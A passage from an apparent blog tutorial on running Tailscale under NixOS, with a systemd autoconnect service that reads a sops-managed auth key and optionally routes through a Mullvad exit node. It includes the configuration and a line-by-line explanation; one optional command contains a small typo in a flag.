also get tailscale to suggest an exit node tailscale exit-node suggest Now that you have an exit node, take a note of it.\nCreating The Tailscale Service: Edit your NixOS configuration.nix and add the below service. # Add tailscale to your system packages environment.systemPackages = [ pkgs.tailscale ]; # Enable the tailscale service services.tailscale.enable = true; #Required for resolution when using mullvad. services.tailscale.useRoutingFeatures = \u0026#34;client\u0026#34;; # Create a oneshot to autoconnect on rebuild/switch systemd.services.tailscale-autoconnect = { description = \u0026#34;Automatic connection to Tailscale\u0026#34;; after = [ \u0026#34;network-pre.target\u0026#34; \u0026#34;tailscale.service\u0026#34; ]; wants = [ \u0026#34;network-pre.target\u0026#34; \u0026#34;tailscale.service\u0026#34; ]; wantedBy = [ \u0026#34;multi-user.target\u0026#34; ]; serviceConfig = { Type = \u0026#34;oneshot\u0026#34;; # Pass our tailscale auth key from sops as a Environmental Variable EnvironmentFile = config.sops.secrets.tailscale_preauth.path; }; # have the job run this shell script script = with pkgs; \u0026#39;\u0026#39; # wait for tailscaled to settle sleep 2 # check if we are already authenticated to tailscale status=\u0026#34;$(${tailscale}/bin/tailscale status -json | ${jq}/bin/jq -r .BackendState)\u0026#34; if [ $status = \u0026#34;Running\u0026#34; ]; then # if so, then do nothing exit 0 fi # otherwise authenticate with tailscale using the key from secrets # Not using mullvad exit node: ${tailscale}/bin/tailscale up -authkey \u0026#34;$TAILSCALE_AUTH_KEY\u0026#34; --accept-routes=true --reset # Using mullvad exit node: # ${tailscale}/bin/tailscale up -authkey \u0026#34;$TAILSCALE_AUTH_KEY\u0026#34; --exit-node-allow-lan-access --exit-node=gb-mnc-wg-201.mullvad.ts.net --accept-routes=true --reset --acccept-dns=true` \u0026#39;\u0026#39;; }; +Important+: As stated before if you have called your Tailscale Auth key in your secrets file something other than tailscale_preauth you will then have to modify the line below. # Pass our tailscale auth key from sops as a Environmental Variable EnvironmentFile = config.sops.secrets.tailscale_preauth.path; Breaking Down The Configuration: Let\u0026rsquo;s break down what each part of this configuration does:\nSystem Package and Service Setup:\nenvironment.systemPackages = [ pkgs.tailscale ] adds the Tailscale package to your system services.tailscale.enable = true enables the Tailscale daemon service services.tailscale.useRoutingFeatures = \u0026quot;client\u0026quot;; The article in the NixOS Wiki about tailscale explains this better If you are using features like subnet routers or exit nodes you will also need to set services.tailscale.useRoutingFeatures to \u0026ldquo;server\u0026rdquo;, \u0026ldquo;client\u0026rdquo; or \u0026ldquo;both\u0026rdquo; depending on the role of your machine.\nAs we are a client in this situation we will set it as client. Automatic Connection Service: The systemd.services.tailscale-autoconnect section creates a systemd service that:\nRuns once during system startup (Type = \u0026quot;oneshot\u0026quot;) Starts after networking and the Tailscale daemon are ready Loads your authentication key from the sops-encrypted file ${tailscale}/bin/tailscale up -authkey \u0026quot;$TAILSCALE_AUTH_KEY\u0026quot; --accept-routes=true Connection Script Logic: The script section:\nWaits 2 seconds for the Tailscale daemon to fully start sleep 2 Checks if you\u0026rsquo;re already connected to Tailscale by querying its status. status=\u0026quot;$(${tailscale}/bin/tailscale status -json | ${jq}/bin/jq -r .BackendState)\u0026quot; If already connected (Running state), exits without doing anything. if [ $status = \u0026quot;Running\u0026quot; ]; then # if so, then do nothing If not connected, authenticates using your stored auth key and passing the relevant arguments. If you are not using mullvad use this one! tailscale up -authkey \u0026quot;$TAILSCALE_AUTH_KEY\u0026quot; --accept-routes=true --reset +Note+: I also use some of my nodes as routers within my home network to allow access to other hosts so I also pass the --accept-routes=true argument, however if you don\u0026rsquo;t do this you can omit this argument. If you are using mullvad use this one! tailscale up -authkey \u0026quot;$TAILSCALE_AUTH_KEY\u0026quot; --exit-node-allow-lan-access --exit-node=gb-mnc-wg-201.mullvad.ts.net --accept-routes=true --reset --acccept-dns=true +Note+: Ensure you add the exit node you have chosen. Rebuilding The System: That\u0026rsquo;s it now run either:\nsudo nixos-rebuild switch flake [location/of/flake] sudo nixos-rebuild switch Check Tailscale is running \u0026amp; connected\n+Note+: If you have already had this service running a you will need to actually run a manual tailscale command too:\nsudo tailscale up --accept-dns=true --accept-routes --exit-node=gb-mnc-wg-201.mullvad.ts.net --exit-node-allow-lan-access --reset ",
